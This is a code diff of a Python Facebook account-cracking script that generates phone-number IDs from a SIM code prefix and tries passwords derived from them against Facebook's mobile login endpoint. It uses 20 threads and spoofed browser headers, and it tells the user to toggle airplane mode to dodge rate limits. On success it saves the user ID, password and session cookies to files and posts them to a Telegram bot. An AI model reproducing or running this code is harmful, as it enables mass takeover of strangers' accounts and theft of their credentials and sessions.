@@ -508,7 +508,7 @@ def mainx2():
     print(f"{K} [{M}0{K}] {WHITE}Back To Menu");print(led)
     sumon = input(f'{wt}Select menu {M}:{H} ')
     if sumon in ["1","01"]:
-        asyncio.run(NUM()) 
+        (NUM()) 
     elif sumon in ["2","02"]:
         digittt()
     elif sumon in ["3","03"]:
@@ -786,98 +786,54 @@ def gf2():
     print('');print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+(ok)) #;print(f' {P}Total cp : {K}'+str(len(cp)));print('')
     input('Press Enter To Go Menu');os.system('python CRAZY-GREEN.py')
 ###_______________________random________1____________________________________________________________________________________________________________________________________________
-async def NUM():
-    user = []
+def NUM():
+  user=[]
+  os.system('clear');banner();print(c7);print(led)
+  kode = input(f'{dot}SELECT CODE {M}: {H}');print(led);print(limitt);print(led)
+  limit = int(input(f'{dot}ENTER LIMIT {M}: {H}'));print(led)
+  xd_cp=input(f'{wt}SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
+  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
+  else:cp_xdx.append('n')
+ # print(led)
+  #cokixx=input(f'{wt}SHOW COOKIES  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
+ #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
+  #else:cokix.append('n')
+  clear();banner();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
+  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
+  hc = input(f'{wt}Select Method {M}:{H} ')
+  if hc in ['1','01']:mtd.append('m1')
+  elif hc in ['2','02']:mtd.append('m2')
+  elif hc in ['3','03']:mtd.append('m3')
+  elif hc in ['4','04']:mtd.append('m4')
+  elif hc in ['5','05']:mtd.append('m5')
+  elif hc in ['6','06']:mtd.append('m6')
+  elif hc in ['7','07']:mtd.append('m7')
+  elif hc in ['8','08']:mtd.append('m8')
+  else:
+      mtd.append('m1')
+  for nmbr in range(limit):
+    nmp = ''.join(random.choice(string.digits) for _ in range(6))
+    user.append(nmp)
+  with tred(max_workers=20) as king_xd:
     os.system('clear')
-    banner()
-    print(c7)
-    print(led)
-    kode = input(f'{dot}SELECT CODE {M}: {H}')
-    print(led)
-    limit = int(input(f'{dot}ENTER LIMIT {M}: {H}'))
-    print(led)
-    xd_cp = input(f'{wt}SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
-    if xd_cp in ['y', 'Y', 'yes', 'Yes', '1']:
-        cp_xdx.append('y')
-    else:
-        cp_xdx.append('n')
-        
-    clear()
-    banner()
-    print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode)
-    print(led)
-    print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]')
-    print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]')
-    print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
-    print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]')
-    print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]')
-    print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]')
-    print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]')
-    print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]')
-    print(led)
-    hc = input(f'{wt}Select Method {M}:{H} ')
-    if hc in ['1', '01']:
-        mtd.append('m1')
-    elif hc in ['2', '02']:
-        mtd.append('m2')
-    elif hc in ['3', '03']:
-        mtd.append('m3')
-    elif hc in ['4', '04']:
-        mtd.append('m4')
-    elif hc in ['5', '05']:
-        mtd.append('m5')
-    elif hc in ['6', '06']:
-        mtd.append('m6')
-    elif hc in ['7', '07']:
-        mtd.append('m7')
-    elif hc in ['8', '08']:
-        mtd.append('m8')
-    else:
-        mtd.append('m1')
-
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(6))
-        user.append(nmp)
-
-    with tred(max_workers=20) as king_xd:
-        os.system('clear')
-        tl = str(len(user))
-        banner()
-        print(f'{dot}METHOD{RED}      : {H}'+hc)
-        print(f'{dot}SIM CODE{RED}    : {H}{kode}')
-        print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}')
-        print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈')
-        print(led)
-
-        for guru in user:
-            ids = kode + guru
-            idf = ids
-            pwv = [ids[:6], ids[:8], ids]
-
-            if 'm1' in mtd:
-                await king_xd.submit(m1, idf, pwv)
-            elif 'm2' in mtd:
-                await king_xd.submit(m2, idf, pwv)
-            elif 'm3' in mtd:
-                await king_xd.submit(m3, idf, pwv)
-            elif 'm4' in mtd:
-                asyncio.ensure_future(m4(idf, pwv))
-            elif 'm5' in mtd:
-                await king_xd.submit(m5, idf, pwv)
-            elif 'm6' in mtd:
-                await king_xd.submit(m6, idf, pwv)
-            elif 'm7' in mtd:
-                await king_xd.submit(m7, idf, pwv)
-            elif 'm8' in mtd:
-                await king_xd.submit(m8, idf, pwv)
-            else:
-                await king_xd.submit(m5, idf, pwv)
-
-    print('')
-    print(f'{N} Hi Dear User Crack process has been completed')
-    input(f'{dot}Press Enter To Go Menu')
-    os.system('python ATOM.py')
-
+    tl = str(len(user))
+    banner();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
+    for guru in user:
+      ids = kode+guru
+      idf = '+1'+ids
+      pwv = [ids[:6],ids[:8],ids,]
+      if 'm1' in mtd:king_xd.submit(m1,idf,pwv)
+      elif 'm2' in mtd:king_xd.submit(m2,idf,pwv)
+      elif 'm3' in mtd:king_xd.submit(m3,idf,pwv)
+      elif 'm4' in mtd:king_xd.submit(m4,idf,pwv)
+      elif 'm5' in mtd:king_xd.submit(m5,idf,pwv)
+      elif 'm6' in mtd:king_xd.submit(m6,idf,pwv)
+      elif 'm7' in mtd:king_xd.submit(m7,idf,pwv)
+      elif 'm8' in mtd:king_xd.submit(m8,idf,pwv)
+      else:
+       king_xd.submit(m5,idf,pwv)
+  print('');print(f'{N} Hi Dear User Crack process has been completed')
+  input(f'{dot}Press Enter To Go Menu');os.system('python ATOM.py')
 ###_______________________random______2______________________________________________________________________________________________________________________________________________
 def digittt():
   user=[]
@@ -1225,75 +1181,71 @@ def m3(idf,pwv):
       waktu(31)
   loop+=1
 
-async def m4(idf, pwv):
+def m4(idf,pwv):
  global loop
  global ok
  global agents
- await m4(idf, pwv)
  animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
- sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M4{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
- async with aiohttp.ClientSession() as session:
-  try:
-   for ps in pwv:
-     ua = random.choice(usragent)
-     free_fb = await session.get('https://m.facebook.com')
-     free_fb_text = await free_fb.text()
-     log_data = {'jazoest': re.search('name="jazoest" value="(.*?)"', free_fb_text).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', free_fb_text).group(1), 'email': idf, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"', free_fb_text).group(1), ps) }
-     header_freefb =  {
-     'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
-     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-     'Accept-Language': 'en-US,en;q=0.9',
-     'Accept-Encoding': 'gzip, deflate, br',
-     'Connection': 'keep-alive',
-     'Upgrade-Insecure-Requests': '1',
-     'Sec-Fetch-Site': 'same-origin',
-     'Sec-Fetch-Mode': 'navigate',
-     'Sec-Fetch-User': '?1',
-     'Sec-Fetch-Dest': 'document',
-     'Cache-Control': 'max-age=0',
-     'Referer': 'https://mbasic.beta.facebook.com/',
-     'DNT': '1',
-     'Pragma': 'no-cache',
-     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-     lo = await session.post('https://mbasic.alpha.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101',data=log_data,headers=header_freefb).text
-     lo_text = await lo.text()
-     log_cookies = session.cookie_jar.filter_cookies('https://mbasic.alpha.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101')
-     if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
-       coki = ";".join([f"{cookie.name}={cookie.value}" for cookie in log_cookies])
-       user = re.findall('c_user=(.*);xs', coki)[0]
-       url = f"https://graph.facebook.com/{user}/picture?type=normal"
-       reqx = await session.get(url)
-       reqx_text = await reqx.text()
-       if 'Photoshop' in reqx_text:
-             print(f'\r\r[P][ATOM-OK]: {user} | {ps}')
-             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
-             with open('/sdcard/ATOM-live-OK.txt', 'a') as f:
-                 f.write(f"{user}|{ps}|{coki}\n")    
-             statusok = f"{user} | {ps} | {coki}"
-             async with session.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={statusok}") as resp:
-                 ok += 1
-                 break
-     elif 'checkpoint' in log_cookies:
-        coki = ";".join([f"{cookie.name}={cookie.value}" for cookie in log_cookies])
-        coki1 = coki.split("1000")[1]
-        uid = "1000"+coki1[0:11]
-        if 'y' in cp_xdx:
-         print(f'\r[P][ATOM-CP.txt] {uid}|{ps}{xxx}')
-        with open('/sdcard/ATOM-CP.txt', 'a') as f:
-          f.write(f"{uid}|{ps}|\n")
-        cp.append(uid)  
-     else:
-       continue
-     await asyncio.sleep(0.1)
-   loop+=1
-  
-  except aiohttp.ClientError as e:
-     print(f"An error occurred: {e}")
-     await asyncio.sleep(10)
-  except Exception as e:
-     pass 
-
-
+ sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M5{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
+ try:
+  for ps in pwv:
+   session = requests.Session()
+   ua = random.choice(usragent)
+   free_fb = session.get('https://lm.facebook.com/').text
+   log_data ={
+    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+    'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+    'email': idf,
+    'login_source': 'comet_headerless_login',
+    'next': '',
+    'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), ps) }
+   header_freefb = {
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive',
+    'Upgrade-Insecure-Requests': '1',
+    'Sec-Fetch-Site': 'same-origin',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-User': '?1',
+    'Sec-Fetch-Dest': 'document',
+    'Cache-Control': 'max-age=0',
+    'Referer': 'https://mbasic.beta.facebook.com/',
+    'DNT': '1',
+    'Pragma': 'no-cache',
+    'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
+   lo = session.post('https://mbasic.alpha.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
+   log_cookies=session.cookies.get_dict().keys()
+   if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
+    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+    user = re.findall('c_user=(.*);xs', coki)[0]
+    url = f"https://graph.facebook.com/{user}/picture?type=normal"
+    reqx = requests.get(url).text
+    if 'Photoshop' in reqx:
+            print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
+            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
+            open('/sdcard/ATOM-M4-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            statusok = (f" {user} | {ps} | {coki} ")
+            requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+            ok+=1
+            break
+   elif 'checkpoint' in log_cookies:
+    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+    coki1 = coki.split("1000")[1]
+    uid = "1000"+coki1[0:11]
+    if 'y' in cp_xdx:
+     print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{uid}|{ps}{xxx}')
+    open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
+    cp.append(uid)
+   else:
+    continue
+   time.sleep(0.01)
+  loop+=1
+ except requests.exceptions.ConnectionError:
+    time.sleep(10)
+ except Exception as e:
+    pass
 def m5(idf,pwv):
  global loop
  global ok
